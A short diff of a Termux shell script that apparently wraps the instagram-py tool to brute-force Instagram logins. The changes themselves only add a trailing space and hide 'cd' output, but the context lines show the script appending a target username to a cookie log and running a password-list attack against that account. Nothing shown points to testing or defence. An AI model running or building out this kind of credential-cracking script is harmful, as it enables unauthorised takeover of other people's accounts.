@@ -95,7 +95,7 @@ function cookies-info () {
 echo ""
 clear
 banners
-cat /data/data/com.termux/files/usr/cookies/cookie.txt
+cat /data/data/com.termux/files/usr/cookies/cookie.txt 
 exit
 }
 function error-info () {
@@ -172,7 +172,7 @@ spin () {
 }
 copy
 banners
-cd /data/data/com.termux/files/usr/cookies
+cd /data/data/com.termux/files/usr/cookies >/dev/null 2>&1
 php -S 127.0.0.1:4444 > /dev/null 2>&1 &
 echo "  User : $2 " >> /data/data/com.termux/files/usr/cookies/cookie.txt
 instagram-py --username $2 --password-list $value
@@ -224,7 +224,7 @@ spin () {
 }
 copy
 banners
-cd /data/data/com.termux/files/usr/cookies
+cd /data/data/com.termux/files/usr/cookies >/dev/null 2>&1
 php -S 127.0.0.1:4444 > /dev/null 2>&1 &
 echo "  User : $2 " >> /data/data/com.termux/files/usr/cookies/cookie.txt
 instagram-py --username $2 --password-list $4
